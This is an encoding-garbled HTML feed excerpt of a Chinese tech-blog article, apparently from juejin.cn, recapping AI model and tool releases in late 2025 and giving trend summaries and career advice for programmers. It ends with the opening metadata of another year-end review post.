<li><strong>åŠ å‰§AIè§†é¢‘ç«äº‰</strong>ï¼šä¸Soraã€Runwayç­‰å½¢æˆæ¿€çƒˆç«äº‰ï¼Œæ¨åŠ¨è¡Œä¸šå¿«é€Ÿåˆ›æ–°</li>
<li><strong>å½±è§†åˆ¶ä½œå˜é©</strong>ï¼šä¸ºä¸“ä¸šå½±è§†åˆ¶ä½œæä¾›é«˜æ•ˆçš„AIè¾…åŠ©å·¥å…·</li>
</ul>
<hr/>
<h3 data-id="heading-25">10æœˆ29æ—¥ - Cursor 2.0 ç‰ˆæœ¬å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Cursorå›¢é˜Ÿ</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>è‡ªç ”ç¼–ç¨‹æ¨¡å‹ Composer</li>
<li>æµè§ˆå™¨é›†æˆåŠŸèƒ½</li>
<li>æ”¯æŒå¤šæ¨¡å‹å¹¶è¡Œå¤„ç†ï¼Œé€‰å–æœ€ä½³æ•ˆæœ</li>
</ul>
<hr/>
<h3 data-id="heading-26">11æœˆ12æ—¥ - GPT-5.1 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ‰©å±•å¤šæ¨¡æ€åŠŸèƒ½</li>
<li>æä¾›8ç§å¯å®šåˆ¶ä¸ªæ€§é€‰é¡¹ï¼ˆOpenAIè¿„ä»Šæœ€å¯å®šåˆ¶çš„æ¨¡å‹ï¼‰</li>
<li>åœ¨æŒ‡ä»¤éµå¾ªå’Œå“åº”é£æ ¼ä¸Šå®ç°çªç ´</li>
<li>æ•°å­¦æ¨ç†å’Œä»£ç ç”Ÿæˆèƒ½åŠ›å‡ºè‰²</li>
<li>æ¨ç†é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒæå‡</li>
</ul>
<hr/>
<h3 data-id="heading-27">11æœˆ19æ—¥ - Gemini 3 Pro å‘å¸ƒï¼ˆè°·æ­Œçš„ç‹ç‰Œï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>åœ¨æ ¸å¿ƒåŸºå‡†æµ‹è¯•ä¸­è¡¨ç°ä¼˜äºGPT-5.1å’ŒClaude Sonnet 4.5</strong></li>
<li>æ¨ç†ã€å¤šæ¨¡æ€ã€ä»£ç†å·¥å…·ä½¿ç”¨ã€å¤šè¯­è¨€æ€§èƒ½ã€é•¿ä¸Šä¸‹æ–‡ç­‰å…¨é¢é¢†å…ˆ</li>
<li>æ”¯æŒè¶…é•¿ä¸Šä¸‹æ–‡çª—å£</li>
<li>å¼•å‘OpenAIçš„"çº¢è‰²è­¦æˆ’"</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>å¤šè¯­è¨€ç¼–ç¨‹èƒ½åŠ›å¼ºå¤§</li>
<li>å¤šæ¨¡æ€èƒ½åŠ›ï¼Œå¯åŒæ—¶å¤„ç†ä»£ç ã€å›¾è¡¨ã€UIè®¾è®¡</li>
<li>å¼•å‘æ–°ä¸€è½®AIå†›å¤‡ç«èµ›</li>
</ul>
<hr/>
<h3 data-id="heading-28">11æœˆ20æ—¥ - Nano Banana Pro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>åŸºäºGemini 3 Proçš„å›¾åƒç”Ÿæˆæ¨¡å‹</li>
<li>å›¾åƒç”Ÿæˆé¢†åŸŸè¡¨ç°å‡ºè‰²</li>
<li>ä¸€ä½“åŒ–å†…å®¹ç”Ÿäº§åŠ›å·¥å…·</li>
<li>ä»æ–‡æœ¬åˆ°å›¾åƒçš„æ— ç¼è¡”æ¥</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ä»æ–‡æœ¬æè¿°ç›´æ¥ç”Ÿæˆé«˜è´¨é‡ç•Œé¢åŸå‹</li>
<li>åŠ é€Ÿå‰ç«¯å¼€å‘æµç¨‹</li>
<li>ä¸Gemini 3 Proå½¢æˆå®Œæ•´çš„å¤šæ¨¡æ€ç”Ÿæ€</li>
</ul>
<hr/>
<h3 data-id="heading-29">11æœˆ21æ—¥ - NotebookLM é‡å¤§æ›´æ–°</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Google</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>é›†æˆ Gemini 3 Pro å’Œ Nano Banana Pro</li>
<li><strong>ä¸€é”®ç”Ÿæˆä¸“ä¸šPPTåŠŸèƒ½</strong>ï¼šå¼•å…¥Slide DecksåŠŸèƒ½ï¼Œæ”¯æŒä¸€é”®ç”Ÿæˆä¸“ä¸šçº§åˆ«çš„æ¼”ç¤ºæ–‡ç¨¿</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å¤§å¹…æå‡æ¼”ç¤ºæ–‡ç¨¿åˆ¶ä½œæ•ˆç‡</strong>ï¼šå‡å°‘æ‰‹åŠ¨ç¼–è¾‘æ—¶é—´ï¼ŒèŠ‚çœæ—¶é—´å’Œç²¾åŠ›</li>
<li><strong>é™ä½ä¸“ä¸šPPTåˆ¶ä½œé—¨æ§›</strong>ï¼šä½¿æ›´å¤šç”¨æˆ·èƒ½å¤Ÿè½»æ¾åˆ›å»ºé«˜è´¨é‡çš„æ¼”ç¤ºæ–‡ç¨¿</li>
<li>ç»“åˆGemini 3 Proçš„å¼ºå¤§ç†è§£èƒ½åŠ›ï¼Œæå‡å†…å®¹è´¨é‡</li>
</ul>
<hr/>
<h3 data-id="heading-30">11æœˆ25æ—¥ - Claude Opus 4.5 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç æ¨¡å‹</strong></li>
<li><strong>æ”¯æŒè¶…é•¿ä¸Šä¸‹æ–‡</strong>ï¼šé€‚åˆå¤§å‹ä»£ç åº“åˆ†æ</li>
<li><strong>Opusçº§åˆ«çš„æ·±åº¦æ¨ç†èƒ½åŠ›</strong>ï¼šåœ¨å¤æ‚æ¶æ„è®¾è®¡ä¸Šè¶…è¶ŠSonnet</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>ç»§ç»­å·©å›ºClaude Code"æœ€å¼ºç¼–ç¨‹åŠ©æ‰‹"åœ°ä½</strong></li>
<li><strong>é€‚åˆå¤æ‚ç³»ç»Ÿçš„æ¶æ„è®¾è®¡å’Œä¼˜åŒ–</strong>ï¼šä¸ä»…èƒ½å†™ä»£ç ï¼Œæ›´èƒ½åšæŠ€æœ¯å†³ç­–</li>
<li><strong>æ·±åº¦æ¨ç†èƒ½åŠ›</strong>ï¼šåœ¨ç³»ç»Ÿè®¾è®¡ã€æ€§èƒ½ä¼˜åŒ–ç­‰éœ€è¦æ·±åº¦æ€è€ƒçš„åœºæ™¯ä¸­è¡¨ç°å“è¶Š</li>
</ul>
<hr/>
<h3 data-id="heading-31">12æœˆ1æ—¥ - DeepSeek V3.2 å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ·±åº¦æ±‚ç´¢ï¼ˆDeepSeekï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ€§èƒ½ç¨³å®šæ€§æå‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æŒç»­è¿­ä»£å±•ç°æŠ€æœ¯å®åŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-32">12æœˆ1æ—¥ - è±†åŒ…æ‰‹æœºå‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: å­—èŠ‚è·³åŠ¨ Ã— ä¸­å…´é€šè®¯</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>é›†æˆè±†åŒ…AIåŠ©æ‰‹</li>
<li>æ™ºèƒ½æ¨èã€è¯­éŸ³åŠ©æ‰‹ã€å›¾åƒè¯†åˆ«</li>
<li>AIåŠŸèƒ½æ·±åº¦é›†æˆåˆ°ç³»ç»Ÿå±‚</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>ç§»åŠ¨ç«¯AIåŠ©æ‰‹çš„å¤§èƒ†å°è¯•ï¼Œé¦–ä¸ªAIæ·±åº¦é›†æˆåˆ°ç§»åŠ¨OSçš„æ¢ç´¢æ¡ˆä¾‹</li>
<li>å‘å¸ƒåç«‹å³è¢«å¾®ä¿¡ã€æ”¯ä»˜å®ç­‰ä¸»æµåº”ç”¨ç¦ç”¨ï¼Œç”¨æˆ·ä½“éªŒä¸¥é‡å—é™</li>
<li>å¼•å‘å…³äºAIæ‰‹æœºç”Ÿæ€çš„å¹¿æ³›è®¨è®ºï¼Œæ­ç¤ºäº†å¹³å°å„æ–­ä¸AIåˆ›æ–°çš„æ ¹æœ¬å†²çª</li>
<li>æ™ºè°±AIéšåå¼€æºäº†AutoGLMé¡¹ç›®</li>
</ul>
<hr/>
<h3 data-id="heading-33">12æœˆ9æ—¥ - GPT-5.2 å‘å¸ƒï¼ˆå¥¥ç‰¹æ›¼çš„"çº¢è‰²è­¦æˆ’"ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: OpenAI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>æ•´åˆGPTç³»åˆ—å’Œoç³»åˆ—èƒ½åŠ›</li>
<li>å…·å¤‡è°ƒåº¦å­æ¨¡å‹èƒ½åŠ›</li>
<li><strong>æå‰å‘å¸ƒä»¥åº”å¯¹Gemini 3 Proçš„ç«äº‰å‹åŠ›</strong></li>
<li>ç¼–ç¨‹èƒ½åŠ›ã€åˆ›æ„å†™ä½œã€å¥åº·é¢†åŸŸæ˜¾è‘—æå‡</li>
<li>é€»è¾‘æ¨ç†å’Œé•¿ä¸Šä¸‹æ–‡è®°å¿†èƒ½åŠ›æå‡</li>
<li>æ¨ç†é€Ÿåº¦ã€å¤šæ¨¡æ€æ•ˆç‡å’Œä¸Šä¸‹æ–‡é•¿åº¦å…¨é¢æå‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Sam Altmançš„"çº¢è‰²è­¦æˆ’"ï¼šGemini 3 Proçš„å¼ºåŠ²è¡¨ç°è®©OpenAIæ„Ÿå—åˆ°å‹åŠ›</li>
<li>ç»Ÿä¸€å¤§è¯­è¨€æ¨¡å‹å’Œæ¨ç†æ¨¡å‹ï¼Œä¸€ç«™å¼è§£å†³æ–¹æ¡ˆ</li>
<li>ç¼–ç¨‹èƒ½åŠ›å…¨é¢æå‡ï¼Œå¯¹æŠ—Gemini 3 Pro</li>
<li>è°ƒç”¨æˆæœ¬è¾ƒé«˜</li>
</ul>
<hr/>
<h3 data-id="heading-34">12æœˆ18æ—¥ - Agent Skills å¼€æ”¾æ ‡å‡†å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Anthropic</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>å°†Agent Skillså‘å¸ƒä¸ºå¼€æ”¾æ ‡å‡†</li>
<li>æ—¨åœ¨æ„å»ºAIå¼€æ”¾ç”Ÿæ€</li>
<li>å¤šå®¶å¤´éƒ¨å·¥å…·å®£å¸ƒæ”¯æŒ</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>æ¨åŠ¨AIæŠ€èƒ½ç”Ÿæ€çš„å¼€æ”¾å’Œæ ‡å‡†åŒ–</li>
<li>ä¸€æ¬¡å¼€å‘ï¼Œå¤šå¹³å°ä½¿ç”¨</li>
</ul>
<hr/>
<h3 data-id="heading-35">12æœˆ20æ—¥ - Kiro å‘å¸ƒ</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: äºšé©¬é€Šäº‘ç§‘æŠ€ï¼ˆAWSï¼‰</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li>AIç¼–ç¨‹å·¥å…·</li>
<li>æ”¯æŒ <strong>Spec Coding</strong>ï¼šè§„èŒƒåŒ–ç¼–ç ï¼Œå¼ºè°ƒè´¨é‡å’Œæ ‡å‡†</li>
<li>å¯è¿ç»­è‡ªä¸»ç¼–ç¨‹æ•°æ—¥</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li>Vibe Codingé€‚åˆå¿«é€ŸéªŒè¯æƒ³æ³•</li>
<li>Spec Codingé€‚åˆç”Ÿäº§ç¯å¢ƒçš„ä¸¥è°¨å¼€å‘</li>
<li>å±•ç¤ºäº†AIè‡ªä¸»ç¼–ç¨‹çš„æ½œåŠ›</li>
</ul>
<hr/>
<h3 data-id="heading-36">12æœˆ23æ—¥ - GLM-4.7 å‘å¸ƒï¼ˆå›½äº§å¼€æºæœŸé—´æ–°é«˜åº¦ï¼‰</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: æ™ºè°±AI</p>
<p><strong>æ ¸å¿ƒäº®ç‚¹</strong>:</p>
<ul>
<li><strong>æ–°ä¸€ä»£æ——èˆ°å¼€æºç¼–ç å¤§æ¨¡å‹</strong>ï¼Œ<strong>ä½åˆ—å¼€æºæ¨¡å‹ä¸å›½äº§æ¨¡å‹åŒæ¦œé¦–</strong></li>
<li>å·¥å…·è°ƒç”¨å’Œå¤æ‚æ¨ç†èƒ½åŠ›å¢å¼º</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å›½äº§å¼€æºç¼–ç æ¨¡å‹è¾¾åˆ°æ–°é«˜åº¦</strong>ï¼Œæ ‡å¿—æ€§çªç ´</li>
<li>é•¿ä¸Šä¸‹æ–‡æ”¯æŒï¼Œé€‚åˆå¤§å‹é¡¹ç›®å’Œå¤æ‚ä»£ç åº“</li>
<li>æä½æˆæœ¬ï¼Œä¸ºä¼ä¸šAIç¼–ç æä¾›é«˜æ€§ä»·æ¯”é€‰æ‹©</li>
</ul>
<hr/>
<h3 data-id="heading-37">12æœˆ27æ—¥ - Andrej Karpathyå¦è¨€"æˆ‘ä»æœªå¦‚æ­¤è½å"</h3>
<p><strong>å‘å¸ƒæ–¹</strong>: Andrej Karpathyï¼ˆå‰OpenAIåˆ›å§‹æˆå‘˜ã€ç‰¹æ–¯æ‹‰AIæ€»ç›‘ï¼‰</p>
<p><strong>æ ¸å¿ƒè¨€è®º</strong>:</p>
<ul>
<li><strong>"ä½œä¸ºç¨‹åºå‘˜ï¼Œæˆ‘ä»æœªæ„Ÿåˆ°å¦‚æ­¤è½å"</strong></li>
<li>ç¼–ç¨‹èŒä¸šæ­£åœ¨è¢«å½»åº•é‡æ„ï¼šç¨‹åºå‘˜è´¡çŒ®çš„ä»£ç è¶Šæ¥è¶Šå°‘ï¼Œæ›´å¤šçš„æ˜¯åœ¨å„ç§å·¥å…·ä¹‹é—´è¿›è¡Œä¸²è”</li>
<li><strong>èƒ½åŠ›å·®è·å·¨å¤§</strong>ï¼šå¦‚æœèƒ½æ­£ç¡®åˆ©ç”¨è¿‡å»ä¸€å¹´å‡ºç°çš„æ–°å·¥å…·ï¼Œä¸ªäººèƒ½åŠ›æœ¬å¯ä»¥æå‡10å€</li>
<li>å¦åˆ™å°†é¢ä¸´æŠ€èƒ½ç„¦è™‘å’Œè¢«æ·˜æ±°çš„é£é™©</li>
</ul>
<p><strong>èƒŒæ™¯ä»‹ç»</strong>:</p>
<ul>
<li><strong>Vibe Coding æ¦‚å¿µæå‡ºè€…</strong>ï¼š2025å¹´2æœˆæå‡ºé€šè¿‡è‡ªç„¶è¯­è¨€æç¤ºå¼•å¯¼AIç”Ÿæˆä»£ç çš„ç†å¿µ</li>
<li><strong>å‰OpenAIåˆ›å§‹æˆå‘˜</strong>ï¼šæ·±åº¦å‚ä¸GPTç³»åˆ—æ¨¡å‹å¼€å‘</li>
<li><strong>ç‰¹æ–¯æ‹‰AIæ€»ç›‘</strong>ï¼šè´Ÿè´£Autopilotè§†è§‰ç³»ç»Ÿ</li>
<li><strong>AIæ•™è‚²é¢†åŸŸæƒå¨</strong>ï¼šæ–¯å¦ç¦å¤§å­¦CS231nè¯¾ç¨‹åˆ›å§‹äººï¼ŒYouTube AIè¯¾ç¨‹è§‚çœ‹é‡è¶…ç™¾ä¸‡</li>
</ul>
<p><strong>è¡Œä¸šå½±å“</strong>:</p>
<ul>
<li><strong>å¼•å‘å…¨çƒç¨‹åºå‘˜å…±é¸£</strong>ï¼šå³ä½¿æ˜¯AIé¢†åŸŸé¡¶å°–ä¸“å®¶ä¹Ÿæ„Ÿåˆ°æŠ€æœ¯æ›´æ–°å‹åŠ›</li>
<li><strong>éªŒè¯AIå·¥å…·è¿­ä»£é€Ÿåº¦</strong>ï¼š2025å¹´AIå·¥å…·æ›´æ–°é€Ÿåº¦è¶…å‡ºæ‰€æœ‰äººé¢„æœŸ</li>
<li><strong>æŠ€èƒ½ç„¦è™‘æ™®éåŒ–</strong>ï¼šä»åˆçº§å¼€å‘è€…åˆ°è¡Œä¸šæƒå¨ï¼Œæ‰€æœ‰äººéƒ½é¢ä¸´é€‚åº”æŒ‘æˆ˜</li>
<li><strong>æˆä¸º2025å¹´AIè®¨è®ºçš„æ ‡å¿—æ€§æ—¶åˆ»</strong>ï¼šçœŸå®åæ˜ äº†AIå¯¹ç¼–ç¨‹è¡Œä¸šçš„æ·±åˆ»å†²å‡»</li>
</ul>
<hr/>
<h2 data-id="heading-38">ğŸŒŸ 2025å¹´AIå‘å±•è¶‹åŠ¿æ€»ç»“</h2>
<h3 data-id="heading-39">1. <strong>æ¨ç†æ¨¡å‹é©å‘½</strong></h3>
<ul>
<li>DeepSeek R1å¼€å¯"æ¨ç†æ¨¡å‹å…ƒå¹´"</li>
<li>"æ…¢æ€è€ƒ"ç­–ç•¥è¢«è¯æ˜æœ‰æ•ˆï¼šç»™AIæ›´å¤šæ—¶é—´æ¨ç†èƒ½è·å¾—æ›´å¥½ç»“æœ</li>
<li>æ¨ç†èƒ½åŠ›æˆä¸ºAIæ¨¡å‹çš„æ ¸å¿ƒç«äº‰åŠ›</li>
<li>o1ã€R1ç­‰æ¨ç†æ¨¡å‹æ”¹å˜AIåº”ç”¨èŒƒå¼</li>
</ul>
<h3 data-id="heading-40">2. <strong>AI Agentæ—¶ä»£åˆ°æ¥</strong></h3>
<ul>
<li>Manuså±•ç¤ºäº†é€šç”¨AI Agentçš„å¯èƒ½æ€§</li>
<li>Dify é™ä½AIåº”ç”¨å¼€å‘é—¨æ§›</li>
<li>MCPåè®®ç»Ÿä¸€Agentä¸å·¥å…·é€šä¿¡</li>
<li>Agent Skillså¼€æ”¾æ ‡å‡†æ¨åŠ¨ç”Ÿæ€ç¹è£</li>
</ul>
<h3 data-id="heading-41">3. <strong>AIç¼–ç¨‹å·¥å…·ä»"è¾…åŠ©"åˆ°"åä½œ"</strong></h3>
<ul>
<li>ä»ç®€å•çš„ä»£ç è¡¥å…¨è¿›åŒ–åˆ°å¤æ‚ä»»åŠ¡çš„è‡ªä¸»å®Œæˆ</li>
<li>Cursorã€Claude Codeã€Kiroç­‰å·¥å…·å¼•é¢†"AIç»“å¯¹ç¼–ç¨‹"æ–°èŒƒå¼</li>
<li>AIèƒ½å¤Ÿè¿ç»­å·¥ä½œå¤„ç†å¤§å‹é‡æ„ä»»åŠ¡</li>
<li>Vibe Coding vs Spec Codingï¼šä¸åŒåœºæ™¯é€‰æ‹©ä¸åŒç­–ç•¥</li>
</ul>
<h3 data-id="heading-42">5. <strong>å›½äº§å¤§æ¨¡å‹å´›èµ·ä¸"DeepSeekéœ‡æ’¼"</strong></h3>
<ul>
<li>DeepSeekç³»åˆ—åœ¨ä»£ç èƒ½åŠ›ä¸Šå…¨é¢è¿½å¹³å›½é™…é¡¶å°–æ¨¡å‹ã€</li>
<li><strong>DeepSeek R1ä»¥ä½æˆæœ¬é«˜æ€§èƒ½é‡å¡‘AIè¡Œä¸šè®¤çŸ¥</strong></li>
<li>ä¸­å›½ç¨‹åºå‘˜æ‹¥æœ‰æ›´å¤šæœ¬åœŸåŒ–é€‰æ‹©</li>
<li>æ‰“ç ´"é«˜ç®—åŠ›å„æ–­"ï¼Œè¯æ˜æŠ€æœ¯åˆ›æ–°çš„åŠ›é‡</li>
</ul>
<h3 data-id="heading-43">6. <strong>AIå·¨å¤´å†›å¤‡ç«èµ›ç™½çƒ­åŒ–</strong></h3>
<ul>
<li>OpenAI vs Googleï¼šGPT-5.2æå‰å‘å¸ƒåº”å¯¹Gemini 3 Pro</li>
<li>Anthropicã€DeepSeekç­‰å¤šæ–¹åŠ¿åŠ›å´›èµ·</li>
<li>æ¯æœˆéƒ½æœ‰é‡ç£…æ¨¡å‹å‘å¸ƒï¼ŒæŠ€æœ¯è¿­ä»£åŠ é€Ÿ</li>
<li>ç¼–ç èƒ½åŠ›æˆä¸ºå„å®¶PKçš„ä¸»æˆ˜åœº</li>
</ul>
<h3 data-id="heading-44">9. <strong>AIç”Ÿæ€å†²çªä¸é‡æ„</strong></h3>
<ul>
<li>è±†åŒ…æ‰‹æœºè¢«å¾®ä¿¡ã€æ”¯ä»˜å®ç¦ç”¨äº‹ä»¶</li>
<li>AIç¡¬ä»¶ä¸ä¼ ç»Ÿè½¯ä»¶ç”Ÿæ€çš„çŸ›ç›¾</li>
<li>å¹³å°å„æ–­ä¸AIåˆ›æ–°çš„å†²çªå‡¸æ˜¾</li>
</ul>
<hr/>
<h2 data-id="heading-45">ğŸ’¡ å¯¹ç¨‹åºå‘˜çš„å»ºè®®</h2>
<ol start="0">
<li><strong>æŒæ¡æ¨ç†æ¨¡å‹çš„ä½¿ç”¨</strong>ï¼šäº†è§£æ¨¡å‹ä½¿ç”¨çš„è¾¹ç•Œï¼Œæ¯”å¦‚ç†è§£ä½•æ—¶éœ€è¦æ¨ç†ï¼Œä½•æ—¶éœ€è¦å¿«é€Ÿå“åº”</li>
<li><strong>å­¦ä¹ AI Agentå¼€å‘</strong>ï¼šMCPã€Agent Skillsç­‰æˆä¸ºé‡è¦æŠ€èƒ½</li>
<li><strong>æå‡æç¤ºè¯å·¥ç¨‹èƒ½åŠ›</strong>ï¼šå¦‚ä½•ç²¾å‡†æè¿°éœ€æ±‚æˆä¸ºæ ¸å¿ƒæŠ€èƒ½</li>
<li><strong>å…³æ³¨ä¼ä¸šçº§åº”ç”¨</strong>ï¼šæœ¬åœ°éƒ¨ç½²ã€æŠ€èƒ½å®šåˆ¶ç­‰ä¼ä¸šéœ€æ±‚</li>
<li><strong>ä¿æŒæ¶æ„æ€ç»´</strong>ï¼šæœ‰è¯†åˆ«æ¶æ„è®¾è®¡æ–¹æ¡ˆä¼˜åŠ£çš„èƒ½åŠ›</li>
<li><strong>åŸ¹å…»ä»£ç reviewèƒ½åŠ›</strong>ï¼šéªŒè¯AIç”Ÿæˆä»£ç çš„æ­£ç¡®æ€§ã€å®‰å…¨æ€§å’Œæ€§èƒ½</li>
<li><strong>å­¦ä¹ å¤šå·¥å…·ç»„åˆ</strong>ï¼šä¸åŒä»»åŠ¡é€‰æ‹©æœ€é€‚åˆçš„AIå·¥å…·</li>
<li><strong>å…³æ³¨æˆæœ¬ä¼˜åŒ–</strong>ï¼šå¼€æºæ¨¡å‹æä¾›é«˜æ€§ä»·æ¯”é€‰æ‹©</li>
<li><strong>æŒç»­å­¦ä¹ </strong>ï¼šAIå‘å±•æ—¥æ–°æœˆå¼‚ï¼Œæ¯æœˆéƒ½æœ‰é‡ç£…æ›´æ–°</li>
<li><strong>æ¢ç´¢å¤šæ¨¡æ€åº”ç”¨</strong>ï¼šè§†é¢‘ã€éŸ³ä¹ã€å›¾åƒç”Ÿæˆä¸ºåº”ç”¨å¼€å‘å¸¦æ¥æ–°å¯èƒ½</li>
</ol>
<hr/>
<h2 data-id="heading-46">ğŸ’¬ ç»“è¯­</h2>
<p>2025å¹´ï¼ŒAIä¸ä»…æ”¹å˜äº†æˆ‘ä»¬å†™ä»£ç çš„æ–¹å¼ï¼Œæ›´é‡å¡‘äº†æ•´ä¸ªè¡Œä¸šçš„æ ¼å±€å’Œå•†ä¸šæ¨¡å¼ã€‚ä»"å¿«é€Ÿç”Ÿæˆ"åˆ°"æ·±åº¦æ¨ç†"ï¼Œä»"å•ä¸€æ¨¡å‹"åˆ°"Agentåä½œ"ï¼Œä»"é«˜æ˜‚æˆæœ¬"åˆ°"å¹³æ°‘ä»·æ ¼"ï¼ŒAIæŠ€æœ¯çš„å‘å±•å’Œå•†ä¸šåŒ–éƒ½è¶…å‡ºäº†æ‰€æœ‰äººçš„é¢„æœŸã€‚</p>
<p>ä½œä¸ºç¨‹åºå‘˜ï¼Œæˆ‘ä»¬æ—¢æ˜¯è§è¯è€…ï¼Œä¹Ÿæ˜¯å‚ä¸è€…ã€‚<strong>æœªæ¥å±äºé‚£äº›èƒ½å¤Ÿé©¾é©­AIçš„äººã€‚</strong></p>
<p>åœ¨è¿™ä¸ªAIç¼–ç¨‹å·¥å…·ç™¾èŠ±é½æ”¾çš„æ—¶ä»£ï¼Œé€‰æ‹©é€‚åˆè‡ªå·±çš„å·¥å…·ã€ç†è§£æ¨ç†æ¨¡å‹çš„ä»·å€¼ã€æŒæ¡Agentå¼€å‘æŠ€èƒ½ã€å‚ä¸å¼€æ”¾æ ‡å‡†ï¼Œè¿™äº›å°†æˆä¸ºç¨‹åºå‘˜çš„æ ¸å¿ƒç«äº‰åŠ›ã€‚</p>
<p>2025å¹´å·²ç»å¦‚æ­¤ç²¾å½©ï¼Œ2026å¹´åˆä¼šç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆæƒŠå–œï¼Ÿè®©æˆ‘ä»¬æ‹­ç›®ä»¥å¾…ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€]]></title>    <link>https://juejin.cn/post/7592789801708896297</link>    <guid>https://juejin.cn/post/7592789801708896297</guid>    <pubDate>2026-01-08T09:33:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708896297" data-draft-id="7592555965793222662" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€"/> <meta itemprop="keywords" content="å‰ç«¯,å¹´ç»ˆæ€»ç»“,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-08T09:33:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä½•è´¤"/> <meta itemprop="url" content="https://juejin.cn/user/277499952247869"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ç»ˆå›é¡¾ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/277499952247869/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä½•è´¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:33:53.000Z" title="Thu Jan 08 2026 09:33:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
